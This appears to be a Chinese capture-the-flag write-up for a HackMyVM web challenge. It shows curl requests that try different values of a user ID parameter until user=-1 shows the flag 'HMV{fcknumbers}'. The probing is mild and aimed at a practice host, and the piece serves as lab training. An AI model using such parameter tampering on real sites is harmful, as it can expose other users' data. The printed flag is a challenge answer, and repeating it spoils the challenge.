![image-20250617113152195](https://7r1umph.top/image/20250617113152556.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:02:26 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


<a href="/index.php?user=1">John</a>
<a href="/index.php?user=2">Monroe</a>
<a href="/index.php?user=3">Vault</a>
<a href="/index.php?user=4">{</a>
<a href="/index.php?user=6">Wesley</a>
<a href="/index.php?user=7">Teresa</a>
<a href="/index.php?user=8">Fredric</a>
<a href="/index.php?user=9">}</a>
                            
```

少个5

访问一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=5
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:03:26 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


<a href="/index.php?user=1">John</a>
<a href="/index.php?user=2">Monroe</a>
<a href="/index.php?user=3">Vault</a>
<a href="/index.php?user=4">{</a>
<a href="/index.php?user=6">Wesley</a>
<a href="/index.php?user=7">Teresa</a>
<a href="/index.php?user=8">Fredric</a>
<a href="/index.php?user=9">}</a>
<br><br><br>o_O                                                                                  
```

没提示，然后就试呗

10没东西

11-20告诉我们没有办法

0没有东西

-1显示了flag

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=-1
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:08:37 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


<a href="/index.php?user=1">John</a>
<a href="/index.php?user=2">Monroe</a>
<a href="/index.php?user=3">Vault</a>
<a href="/index.php?user=4">{</a>
<a href="/index.php?user=6">Wesley</a>
<a href="/index.php?user=7">Teresa</a>
<a href="/index.php?user=8">Fredric</a>
<a href="/index.php?user=9">}</a>
<br><br><br>HMV{fcknumbers}                                                                                                                                                                                   
```

